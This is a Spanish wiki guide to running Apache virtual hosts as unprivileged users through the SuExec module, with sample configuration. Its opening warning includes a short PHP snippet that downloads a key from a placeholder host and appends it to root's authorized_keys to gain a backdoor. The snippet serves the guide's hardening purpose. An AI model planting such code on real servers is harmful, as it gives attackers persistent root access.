## Contents

*   [1 Apache, SuExec y los servidores virtuales](#Apache.2C_SuExec_y_los_servidores_virtuales)
    *   [1.1 Prerequisitos](#Prerequisitos)
    *   [1.2 Añadiéndo el módulo SuExec a Apache](#A.C3.B1adi.C3.A9ndo_el_m.C3.B3dulo_SuExec_a_Apache)
    *   [1.3 Establecer un servidor virtual que utilice SuExec](#Establecer_un_servidor_virtual_que_utilice_SuExec)
    *   [1.4 Deshabilitando el directorio "DocumentRoot" por defecto](#Deshabilitando_el_directorio_.22DocumentRoot.22_por_defecto)
    *   [1.5 Rematando](#Rematando)
    *   [1.6 Referencias externas](#Referencias_externas)

## Apache, SuExec y los servidores virtuales

Este documento describe cómo utilizar el módulo SuExec de Apache para suministrar servidores virtuales corriendo com un usuario sin privilegios. Generalmente es una buena práctica no permitir privilegios de superusuario a ninguna parte de lespacio web como muestra de manera un tanto brutal este ejemplo PHP:

```
   <?php
     # este enlace por supuesto no lleva a ninguna parte
     $rsa_key = file('http://yourhost.homeip.net/id_rsa.pub');
     exec("cat ${rsa_key[[0]]} >>/root/.ssh/authorized_keys");
   ?>

```

Coge la idea, verdad? Para impedir esto, no permita nunca a ningún servidor virtual tener acceso de escritura en ninguna parte excepto en su propio directorio personal o en el directorio DocumentRoot. Desgraciadamente este método requiere que Apache sea ejecutado como superusuario para que pueda ser capaz de convertirse en otro usuario pero esto no es una buena idea ya que usted no necesita que Apache se ejecute también como superusuario en el directorio DocumentRoot por defecto.

Debería usted condiderar también el uso de SuExec si pretende tener varias cuentas FTP apuntando a aquellos espacios web que necesiten permisos de escritura manteniéndose la posibilidad de lectura de los ficheros por parte de Apache.

#### Prerequisitos

*   debería estar familiarizado con la configuración básica de Apache
    *   especialmente con los servidores virtuales
*   Acceso de superusuario a la caja objetivo
*   Conocimiento acerca de añadir usuarios
*   saber trabajar con pacman

#### Añadiéndo el módulo SuExec a Apache

*   cargue el módulo SuExec en */etc/httpd/conf/httpd.conf* así

```
LoadModule suexec_module        lib/apache/mod_suexec.so

```

*   asegúrese de que el directorio DocumentRoot por defecto de Apache no corre tampoco como superusuario!

```
 User nobody
 Group nobody

```

#### Establecer un servidor virtual que utilice SuExec

Una manera de hacerlo es directamnete en el archivo */etc/httpd/conf/httpd.conf* pero le sugiero que use un archivo diferente si pretende crear más de una pareja de servidores virtuales. De cualquier manera, un servidor virtual que se supone que utiliza SuExec puede ser algo así:

```
<VirtualHost 192.168.0.1:80>
        ServerName myhost
        ServerAlias  myhost.localdomain
        # aquí es donde van las peticiones de /
        DocumentRoot /home/www/vhosts/myhost.localdomain/htdocs

        # aquí establece qué usuario (myhost) y qué grupo (ftponly) debería usar Apache
        SuexecUserGroup myhost ftponly

        # lo siguiente es opcional pero podría serle útil
        ScriptAlias /cgi-bin/ /home/www/vhosts/myhost.localdomain/htdocs/cgi-bin
        php_admin_value open_basedir /home/www/vhosts/myhost.localdomain/htdocs
        php_admin_value upload_tmp_dir  /home/www/vhosts/myhost.localdomain/htdocs/tmp
        php_admin_flag safe_mode On
        ErrorDocument 404 /home/www/vhosts/myhost.localdomain
        <Directory "/home/www/vhosts/myhost.localdomain/htdocs">
                AllowOverride None
                Options +SymlinksIfOwnerMatch +Includes
        </Directory>
</VirtualHost>

```

#### Deshabilitando el directorio "DocumentRoot" por defecto

Para hacer más segura aún su configuración puede deshabilitar el directorio *DocumentRoot* por defecto para que Apache no ejecute nada como lo hace el mismo superuser. Este procedimiento no lo deshabilita realmente, si no que apunta a un lugar donde ya no es accesible remotamente. Se puede lograr esto fácilemente reemplazando su *ServerName* por defecto con lo siguiente:

```
 ServerName localhost:80

```

#### Rematando

Como siempre que se cambia la configuración por defecto hay que rearrancar Apache para que los cambios tengan efecto.

```
 /etc/rc.d/httpd restart

```

#### Referencias externas

*   más información en profundidad acerca de SuExec: [http://httpd.apache.org/docs/suexec.html](http://httpd.apache.org/docs/suexec.html)
*   lo mismo acerca de los servidores virtuales: [http://httpd.apache.org/docs/vhosts/index.html](http://httpd.apache.org/docs/vhosts/index.html)

* * *

Autor: kth5